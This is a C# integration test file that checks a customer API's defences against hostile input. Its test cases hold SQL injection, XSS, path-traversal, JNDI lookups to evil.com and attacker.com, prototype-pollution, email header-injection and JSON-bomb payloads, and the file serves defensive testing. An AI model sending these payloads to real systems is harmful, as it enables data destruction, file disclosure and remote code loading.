using System.Net;
using System.Text;
using System.Text.Json;
using FluentAssertions;
using Microsoft.AspNetCore.Mvc.Testing;
using Stocker.TestUtilities;
using Xunit;

namespace Stocker.IntegrationTests.Security;

/// <summary>
/// Security tests focusing on input validation, sanitization and injection attacks
/// </summary>
public class InputValidationSecurityTests : IntegrationTestBase, IClassFixture<WebApplicationFactory<Program>>
{
    private readonly Guid _testTenantId = Guid.NewGuid();

    public InputValidationSecurityTests(WebApplicationFactory<Program> factory) : base(factory)
    {
    }

    [Theory]
    [InlineData("'; DROP TABLE Customers; --")]
    [InlineData("' OR '1'='1' --")]
    [InlineData("' UNION SELECT * FROM Users --")]
    [InlineData("admin'; DELETE FROM Customers WHERE '1'='1")]
    [InlineData("test@test.com'; INSERT INTO Customers VALUES('hacked')--")]
    public async Task CreateCustomer_WithSQLInjectionInEmail_ShouldReject(string maliciousEmail)
    {
        // Arrange
        AuthenticateAsAdmin();
        
        var createRequest = new
        {
            Name = "Test Customer",
            Email = maliciousEmail,
            Phone = "+1234567890",
            Street = "123 Main St",
            City = "Test City",
            State = "Test State",
            PostalCode = "12345",
            Country = "Test Country"
        };

        var json = JsonSerializer.Serialize(createRequest);
        var content = new StringContent(json, Encoding.UTF8, "application/json");

        // Act
        var response = await Client.PostAsync($"/api/tenants/{_testTenantId}/customers", content);

        // Assert
        response.StatusCode.Should().Be(HttpStatusCode.BadRequest, 
            "SQL injection attempts should be blocked by validation");
            
        var responseContent = await response.Content.ReadAsStringAsync();
        responseContent.Should().NotContain("DROP");
        responseContent.Should().NotContain("DELETE");
        responseContent.Should().NotContain("UNION");
    }

    [Theory]
    [InlineData("<script>alert('xss')</script>")]
    [InlineData("<img src=x onerror=alert('xss')>")]
    [InlineData("javascript:alert('xss')")]
    [InlineData("<iframe src='javascript:alert(1)'></iframe>")]
    [InlineData("<svg onload=alert('xss')>")]
    [InlineData("${7*7}")]
    [InlineData("{{7*7}}")]
    public async Task CreateCustomer_WithXSSPayloads_ShouldSanitize(string xssPayload)
    {
        // Arrange
        AuthenticateAsAdmin();
        
        var createRequest = new
        {
            Name = xssPayload,
            Email = $"test{Guid.NewGuid():N}@example.com",
            Phone = "+1234567890",
            Street = "123 Main St",
            City = "Test City",
            State = "Test State",
            PostalCode = "12345",
            Country = "Test Country"
        };

        var json = JsonSerializer.Serialize(createRequest);
        var content = new StringContent(json, Encoding.UTF8, "application/json");

        // Act
        var response = await Client.PostAsync($"/api/tenants/{_testTenantId}/customers", content);

        // Assert
        var responseContent = await response.Content.ReadAsStringAsync();
        responseContent.Should().NotContain("<script>");
        responseContent.Should().NotContain("javascript:");
        responseContent.Should().NotContain("onerror=");
        responseContent.Should().NotContain("onload=");
        responseContent.Should().NotContain("alert(");
    }

    [Theory]
    [InlineData("../../../../etc/passwd")]
    [InlineData("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts")]
    [InlineData("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd")]
    [InlineData("....//....//....//etc/passwd")]
    [InlineData("\\\\server\\share\\secret.txt")]
    public async Task CreateCustomer_WithPathTraversal_ShouldReject(string pathTraversalPayload)
    {
        // Arrange
        AuthenticateAsAdmin();
        
        var createRequest = new
        {
            Name = pathTraversalPayload,
            Email = $"test{Guid.NewGuid():N}@example.com",
            Phone = "+1234567890",
            Street = "123 Main St",
            City = "Test City",
            State = "Test State",
            PostalCode = "12345",
            Country = "Test Country"
        };

        var json = JsonSerializer.Serialize(createRequest);
        var content = new StringContent(json, Encoding.UTF8, "application/json");

        // Act
        var response = await Client.PostAsync($"/api/tenants/{_testTenantId}/customers", content);

        // Assert
        var responseContent = await response.Content.ReadAsStringAsync();
        responseContent.Should().NotContain("/etc/passwd");
        responseContent.Should().NotContain("\\windows\\");
        responseContent.Should().NotContain("hosts");
        responseContent.Should().NotContain("secret.txt");
    }

    [Theory]
    [InlineData("${jndi:ldap://evil.com/exploit}")]
    [InlineData("${jndi:rmi://attacker.com:1099/exploit}")]
    [InlineData("${jndi:dns://malicious.com/a}")]
    [InlineData("${${lower:j}ndi:ldap://evil.com/a}")]
    public async Task CreateCustomer_WithJNDIInjection_ShouldReject(string jndiPayload)
    {
        // Arrange
        AuthenticateAsAdmin();
        
        var createRequest = new
        {
            Name = jndiPayload,
            Email = $"test{Guid.NewGuid():N}@example.com",
            Phone = "+1234567890",
            Street = "123 Main St",
            City = "Test City",
            State = "Test State",
            PostalCode = "12345",
            Country = "Test Country"
        };

        var json = JsonSerializer.Serialize(createRequest);
        var content = new StringContent(json, Encoding.UTF8, "application/json");

        // Act
        var response = await Client.PostAsync($"/api/tenants/{_testTenantId}/customers", content);

        // Assert
        var responseContent = await response.Content.ReadAsStringAsync();
        responseContent.Should().NotContain("jndi:");
        responseContent.Should().NotContain("ldap://");
        responseContent.Should().NotContain("rmi://");
        responseContent.Should().NotContain("evil.com");
        responseContent.Should().NotContain("attacker.com");
    }

    [Fact]
    public async Task CreateCustomer_WithExcessivelyLongInput_ShouldReject()
    {
        // Arrange
        AuthenticateAsAdmin();
        
        var longString = new string('A', 10000); // Very long string
        var createRequest = new
        {
            Name = longString,
            Email = $"test{Guid.NewGuid():N}@example.com",
            Phone = "+1234567890",
            Street = longString,
            City = longString,
            State = "Test State",
            PostalCode = "12345",
            Country = "Test Country"
        };

        var json = JsonSerializer.Serialize(createRequest);
        var content = new StringContent(json, Encoding.UTF8, "application/json");

        // Act
        var response = await Client.PostAsync($"/api/tenants/{_testTenantId}/customers", content);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.RequestEntityTooLarge);
    }

    [Theory]
    [InlineData("test@test\0.com")]
    [InlineData("Customer\0Name")]
    [InlineData("Street\0\0Address")]
    public async Task CreateCustomer_WithNullBytes_ShouldSanitize(string inputWithNulls)
    {
        // Arrange
        AuthenticateAsAdmin();
        
        var createRequest = new
        {
            Name = inputWithNulls,
            Email = $"test{Guid.NewGuid():N}@example.com",
            Phone = "+1234567890",
            Street = "123 Main St",
            City = "Test City",
            State = "Test State",
            PostalCode = "12345",
            Country = "Test Country"
        };

        var json = JsonSerializer.Serialize(createRequest);
        var content = new StringContent(json, Encoding.UTF8, "application/json");

        // Act
        var response = await Client.PostAsync($"/api/tenants/{_testTenantId}/customers", content);

        // Assert
        var responseContent = await response.Content.ReadAsStringAsync();
        responseContent.Should().NotContain("\\0");
    }

    [Theory]
    [InlineData("AAAAAAAAAA", 1000)] // 1000 * 10 chars
    [InlineData("B", 50000)] // 50,000 chars
    public async Task CreateCustomer_WithRepeatingPatterns_ShouldHandleReasonably(string pattern, int repetitions)
    {
        // Arrange
        AuthenticateAsAdmin();
        
        var longRepeatingString = string.Concat(Enumerable.Repeat(pattern, repetitions));
        var createRequest = new
        {
            Name = longRepeatingString,
            Email = $"test{Guid.NewGuid():N}@example.com",
            Phone = "+1234567890",
            Street = "123 Main St",
            City = "Test City",
            State = "Test State",
            PostalCode = "12345",
            Country = "Test Country"
        };

        var json = JsonSerializer.Serialize(createRequest);
        var content = new StringContent(json, Encoding.UTF8, "application/json");

        // Act
        var response = await Client.PostAsync($"/api/tenants/{_testTenantId}/customers", content);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.RequestEntityTooLarge,
            HttpStatusCode.InternalServerError);
    }

    [Theory]
    [InlineData("{\"__proto__\":{\"isAdmin\":true}}")]
    [InlineData("{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}")]
    [InlineData("{\"prototype\":{\"admin\":true}}")]
    public async Task CreateCustomer_WithPrototypePollution_ShouldReject(string maliciousJson)
    {
        // Arrange
        AuthenticateAsAdmin();
        
        var content = new StringContent(maliciousJson, Encoding.UTF8, "application/json");

        // Act
        var response = await Client.PostAsync($"/api/tenants/{_testTenantId}/customers", content);

        // Assert
        response.StatusCode.Should().Be(HttpStatusCode.BadRequest);
        
        var responseContent = await response.Content.ReadAsStringAsync();
        responseContent.Should().NotContain("__proto__");
        responseContent.Should().NotContain("constructor");
        responseContent.Should().NotContain("prototype");
    }

    [Theory]
    [InlineData("email@domain\r\nBcc: attacker@evil.com")]
    [InlineData("email@domain\nBcc: attacker@evil.com")]
    [InlineData("test@test.com\r\nTo: victim@target.com")]
    [InlineData("normal@email.com%0d%0aBcc:attacker@evil.com")]
    public async Task CreateCustomer_WithEmailHeaderInjection_ShouldReject(string maliciousEmail)
    {
        // Arrange
        AuthenticateAsAdmin();
        
        var createRequest = new
        {
            Name = "Test Customer",
            Email = maliciousEmail,
            Phone = "+1234567890",
            Street = "123 Main St",
            City = "Test City",
            State = "Test State",
            PostalCode = "12345",
            Country = "Test Country"
        };

        var json = JsonSerializer.Serialize(createRequest);
        var content = new StringContent(json, Encoding.UTF8, "application/json");

        // Act
        var response = await Client.PostAsync($"/api/tenants/{_testTenantId}/customers", content);

        // Assert
        response.StatusCode.Should().Be(HttpStatusCode.BadRequest);
        
        var responseContent = await response.Content.ReadAsStringAsync();
        responseContent.Should().NotContain("Bcc:");
        responseContent.Should().NotContain("To:");
        responseContent.Should().NotContain("\r\n");
        responseContent.Should().NotContain("%0d%0a");
    }

    [Theory]
    [InlineData("abc\uFEFF")]  // BOM character
    [InlineData("test\u200B")] // Zero-width space
    [InlineData("name\u00A0")] // Non-breaking space
    [InlineData("test\u2028")] // Line separator
    [InlineData("name\u2029")] // Paragraph separator
    public async Task CreateCustomer_WithUnicodeAttacks_ShouldHandle(string unicodePayload)
    {
        // Arrange
        AuthenticateAsAdmin();
        
        var createRequest = new
        {
            Name = unicodePayload,
            Email = $"test{Guid.NewGuid():N}@example.com",
            Phone = "+1234567890",
            Street = "123 Main St",
            City = "Test City",
            State = "Test State",
            PostalCode = "12345",
            Country = "Test Country"
        };

        var json = JsonSerializer.Serialize(createRequest);
        var content = new StringContent(json, Encoding.UTF8, "application/json");

        // Act
        var response = await Client.PostAsync($"/api/tenants/{_testTenantId}/customers", content);

        // Assert
        // Should handle Unicode characters gracefully
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.Created,
            HttpStatusCode.BadRequest);
    }

    [Fact]
    public async Task CreateCustomer_WithNestedJsonBombing_ShouldReject()
    {
        // Arrange
        AuthenticateAsAdmin();
        
        // Create deeply nested JSON structure that could cause stack overflow
        var nestedJson = "{\"a\":" + string.Concat(Enumerable.Repeat("{\"nested\":", 1000)) + 
                        "\"value\"" + string.Concat(Enumerable.Repeat("}", 1001));
        
        var content = new StringContent(nestedJson, Encoding.UTF8, "application/json");

        // Act
        var response = await Client.PostAsync($"/api/tenants/{_testTenantId}/customers", content);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.RequestEntityTooLarge,
            HttpStatusCode.InternalServerError);
    }

    [Fact]
    public async Task CreateCustomer_WithLargeJsonPayload_ShouldReject()
    {
        // Arrange
        AuthenticateAsAdmin();
        
        var largePayload = new
        {
            Name = "Test Customer",
            Email = $"test{Guid.NewGuid():N}@example.com",
            Phone = "+1234567890",
            Street = "123 Main St",
            City = "Test City",
            State = "Test State",
            PostalCode = "12345",
            Country = "Test Country",
            LargeData = new string('X', 10_000_000) // 10MB of data
        };

        var json = JsonSerializer.Serialize(largePayload);
        var content = new StringContent(json, Encoding.UTF8, "application/json");

        // Act
        var response = await Client.PostAsync($"/api/tenants/{_testTenantId}/customers", content);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.RequestEntityTooLarge);
    }

    [Theory]
    [InlineData("../../../etc/passwd")]
    [InlineData("..\\..\\..\\windows\\win.ini")]
    [InlineData("file:///etc/passwd")]
    [InlineData("file://C:\\windows\\system32\\drivers\\etc\\hosts")]
    public async Task SearchCustomers_WithPathTraversal_ShouldBeSafe(string maliciousSearch)
    {
        // Arrange
        AuthenticateAsAdmin();

        // Act
        var response = await Client.GetAsync($"/api/tenants/{_testTenantId}/customers?search={Uri.EscapeDataString(maliciousSearch)}");

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.BadRequest,
            HttpStatusCode.NotFound);
            
        var responseContent = await response.Content.ReadAsStringAsync();
        responseContent.Should().NotContain("/etc/passwd");
        responseContent.Should().NotContain("win.ini");
        responseContent.Should().NotContain("root:");
    }

    [Fact]
    public async Task CreateCustomer_WithCircularReference_ShouldHandle()
    {
        // This test checks if the API handles circular references in JSON gracefully
        // Most modern JSON serializers prevent this, but we test the behavior
        
        // Arrange
        AuthenticateAsAdmin();
        
        var maliciousJson = """
        {
            "Name": "Test",
            "Email": "test@test.com",
            "Phone": "+1234567890",
            "Street": "123 Main St",
            "City": "Test City",
            "State": "Test State",
            "PostalCode": "12345",
            "Country": "Test Country",
            "SelfReference": {
                "$ref": "#"
            }
        }
        """;
        
        var content = new StringContent(maliciousJson, Encoding.UTF8, "application/json");

        // Act
        var response = await Client.PostAsync($"/api/tenants/{_testTenantId}/customers", content);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.UnprocessableEntity);
    }
}